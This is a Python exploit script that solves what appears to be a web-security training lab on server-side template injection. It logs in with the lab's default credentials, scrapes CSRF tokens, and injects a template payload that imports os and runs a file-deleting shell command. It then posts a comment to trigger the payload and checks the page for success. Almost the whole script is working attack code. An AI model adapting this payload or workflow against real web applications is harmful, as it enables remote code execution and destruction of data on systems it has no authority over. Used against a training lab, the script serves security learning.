from colorama import Fore
import argparse
import requests
import urllib3
import time
import re

          # disable request warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {"http":"http://127.0.0.1:8080","https":"http://127.0.0.1:8080"}

YELLOW = Fore.YELLOW
GREEN  = Fore.GREEN
RED    = Fore.RED

def getURL():
  parser = argparse.ArgumentParser(description='Example script with command-line arguments')
  parser.add_argument('-u', '--url' , help='Lab URL')
  args = parser.parse_args()
  if not any(vars(args).values()):
      parser.print_help()
      exit(1)
  LabUrl = args.url
  validUrl = re.match(r'^https?://\S+', LabUrl)
  if not validUrl:
    print(RED,"[-]",GREEN,"Please Enter Valid URL")
    exit(1)
  if LabUrl[-1] == '/':
    LabUrl = LabUrl[:-1]

  return LabUrl

def POST(url, cookies=None, data=None, proxies=None, headers=None, allow_redirects=False):
  try:
    return requests.post(url, cookies=cookies, data=data, headers=headers, proxies=proxies, allow_redirects=allow_redirects)
  except:
    print(RED,"[-]",GREEN,"POST request Faild to this url",RED,"=>",GREEN,url)
    exit(1)

def GET(url, cookies=None, data=None, proxies=None, headers=None, allow_redirects=False):
  try:
    return requests.get(url, cookies=cookies, params=data, headers=headers, proxies=proxies, allow_redirects=allow_redirects)
  except:
    print(RED,"[-]",GREEN,"POST request Faild to this url",RED,"=>",GREEN,url)
    exit(1)

def getCSRF(html_text):
  csrf_pattern = re.compile(r'<input[^>]*name="csrf"[^>]*value="([^"]+)"')
  csrf_match = csrf_pattern.search(html_text)
  csrf_token = csrf_match.group(1)
  return csrf_token

def login(url):
  loginPath = "/login"
  accountPath = "/my-account"

  getLoginPage = GET(url + loginPath)
  cookies = {"session": getLoginPage.cookies['session']}
  csrf_token = getCSRF(getLoginPage.text)

  loginCredential = {
    "username":"wiener",
    "password":"peter",
    "csrf":csrf_token
  }
  
  wienerLoginPage = POST(url + loginPath, cookies, loginCredential)

  cookies = {"session": wienerLoginPage.cookies['session']}

  wienerAccount = GET(url + accountPath, cookies)

  print(GREEN,"[+]",GREEN,"Login Successfully with this credential",YELLOW,loginCredential)

  csrf_token = getCSRF(wienerAccount.text)

  return cookies, csrf_token

def exploit(url, cookies, csrf_token):
  print(GREEN,"[+]",RED,"Starting Attack")

  vulnPath = "/my-account/change-blog-post-author-display"
  createCommentPath = "/post/comment"
  commentPath = "/post?postId=9"

  confirmatoinPath = "/post/comment/confirmation?postId=1"

  sstiPayload = "user.first_name}}{% import os;os.system('rm morale.txt') %}"
  data = f"blog-post-author-display={sstiPayload}&csrf={csrf_token}"

  print(GREEN,"[+]",GREEN,"Sending SSTI Paload",RED,"=>",YELLOW,sstiPayload)
  sendPaload = POST(url + vulnPath, cookies, data)

  data = f"csrf={csrf_token}&postId=9&comment=hacker comment"

  print(GREEN,"[+]",GREEN,"Create Comment to run SSTI Payload")
  createComment = POST(url + createCommentPath, cookies, data,None,None,True)

  getCommentPage = GET(url + commentPath, cookies)

  if 'Congratulations' in getCommentPage.text:
    print(GREEN,"[+]",GREEN,"Attack successfully",YELLOW,"=>",GREEN,"Lab Solved")
  else:
    from time import sleep
    sleep(3)
    getCommentPage = GET(url + commentPath, cookies)
    if 'Congratulations' in getCommentPage.text:
      print(GREEN,"[+]",GREEN,"Attack successfully",YELLOW,"=>",GREEN,"Lab Solved")
    else:
      print(RED,"[+]",GREEN,"Attack Falid",RED,"=>",RED,"Lab Not Solved")
      exit(1)

LabUrl = getURL()
cookies, csrf_token = login(LabUrl)
exploit(LabUrl, cookies, csrf_token)